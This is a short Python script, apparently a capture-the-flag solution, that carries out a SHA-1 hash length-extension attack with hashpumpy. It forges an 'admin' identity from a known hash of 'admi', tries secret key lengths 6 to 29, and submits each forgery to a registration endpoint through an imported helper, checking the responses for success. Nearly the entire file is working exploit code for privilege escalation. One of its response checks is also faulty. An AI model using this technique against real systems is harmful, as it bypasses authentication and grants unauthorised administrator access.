# hello
from os import stat
import hashpumpy
import urllib.parse
import string

from functions import stick_register, stick_login, stick_member

import random
domains = [ "hotmail.com", "gmail.com", "aol.com", "mail.com" , "mail.kz", "yahoo.com"]
letters = string.ascii_lowercase[:12]

def get_random_domain(domains):
    return random.choice(domains)

def get_random_name(letters, length):
    return ''.join(random.choice(letters) for _ in range(length))

def generate_random_emails(nb, length):
    return [get_random_name(letters, length) + '%40' + get_random_domain(domains) for _ in range(nb)]

def main():
    # admi / '4dd28ad0560441245de6fda3973890eeb41b702d' / variable key length
    results = []
    for i in range(6, 30):
        data = hashpumpy.hashpump('4dd28ad0560441245de6fda3973890eeb41b702d', "admi", 'n', i)
        results.append(data)

    for r in results:
        register_user = urllib.parse.quote_from_bytes(r[1])
        print("{} => {}".format(r[0], register_user))
        print(register_user)
        status, data = stick_member(register_user, '5b18c8fd186116e2c474fd89e68b3f46f402e563', prefix='admi')

        print("Code: {}".format(status))
        if status == 200:
            resp = data.getvalue().decode()
            if resp.find('Missing') > 0:
                print("KO: Missing fields")
                break 
            elif resp.find('Invalid') > 0: 
                print("KO: Invalid fields")
                break
            elif resp.find('User exist') > 0:
                print("KO: User exist, try with another email")
                break
            elif resp.find('Registered !') > 0:
                print("OK: Registered")
            elif resp.find('email or password empty'):
                print("KO: Hash doesn't work")
            else:
                print(resp)

if __name__ == "__main__":
    main()